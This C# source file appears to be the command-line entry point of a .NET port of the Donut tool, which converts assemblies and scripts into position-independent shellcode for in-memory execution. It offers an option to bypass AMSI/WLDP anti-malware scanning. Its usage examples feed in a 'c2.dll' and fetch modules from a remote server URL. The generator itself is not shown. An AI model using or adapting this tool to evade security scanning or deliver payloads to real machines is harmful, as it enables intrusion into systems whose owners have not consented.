﻿using System;
using System.IO;
using System.Text;
using System.Runtime.InteropServices;

using CommandLine;
using DonutCS.Structs;

namespace DonutCS
{
    public class Donut
    {
        public static void Main(string[] args)
        {
            // Init Config Struct
            DSConfig config = new Helper().InitStruct("DSConfig");

            Console.WriteLine("Parsing Arguements:");
            // Parse args and assign to struct
            Parser.Default.ParseArguments<Options>(args).WithParsed(opts =>
            {
                if (opts.InputFile.Equals(null) == true)
                {
                    opts.GetUsage();
                    Environment.Exit(0);
                }
                else
                {
                    Helper.ParseArguments(opts, ref config);
                }
            });

            // Start Generation with Config
            int ret = Generator.Donut_Create(ref config);

            // Write Result
            Console.WriteLine($"\nReturn Value:\n\t{Helper.GetError(ret)}\n");
            if (ret != Constants.DONUT_ERROR_SUCCESS)
            {
                Marshal.FreeHGlobal(config.pic);
                Environment.Exit(0);
            }

            // Free PIC shellcode
            Marshal.FreeHGlobal(config.pic);
        }
    }

    public class Options
    {
        [Option('f', "InputFile", Required = true, HelpText = ".NET assembly, EXE, DLL, VBS, JS or XSL file to execute in-memory.")]
        public string InputFile { get; set; }

        [Option('u', "URL", HelpText = "HTTP server that will host the donut module.")]
        public string URL { get; set; }

        [Option('a', "Arch", HelpText = "Target architecture : 1=x86, 2=amd64, 3=amd64+x86.", Default = 3)]
        public int Arch { get; set; }

        [Option('b', "Level", HelpText = "Bypass AMSI/WLDP : 1=skip, 2=abort on fail, 3=continue on fail.", Default = 3)]
        public int Level { get; set; }

        [Option('o', "Payload", HelpText = "Output file.", Default = @"payload.bin")]
        public string Payload { get; set; }

        [Option('c', "NamespaceClass", HelpText = "Optional class name.  (required for .NET DLL)")]
        public string NamespaceClass { get; set; }

        [Option('m', "Method", HelpText = "Optional method or API name for DLL. (required for .NET DLL)")]
        public string Method { get; set; }

        [Option('p', "Args", HelpText = "Optional parameters or command line, separated by comma or semi-colon.")]
        public string Args { get; set; }

        [Option('r', "Version", HelpText = "CLR runtime version. MetaHeader used by default or v4.0.30319 if none available.")]
        public string Version { get; set; }

        [Option('d', "Name", HelpText = "AppDomain name to create for .NET. Randomly generated by default.")]
        public string Name { get; set; }

        public string GetUsage()
        {
            var usage = new StringBuilder();
            usage.Append("[!] Usage: donut [options] -f <EXE/DLL/VBS/JS/XSL>\n");
            usage.Append("[!] Examples:\n");
            usage.Append("    donut -f c2.dll\n");
            usage.Append("    donut -a1 -cTestClass -mRunProcess -pnotepad.exe -floader.dll\n");
            usage.Append("    donut -f loader.dll -c TestClass -m RunProcess -p notepad.exe,calc.exe -u http://remote_server.com/modules/\n");
            return usage.ToString();
        }
    }
}
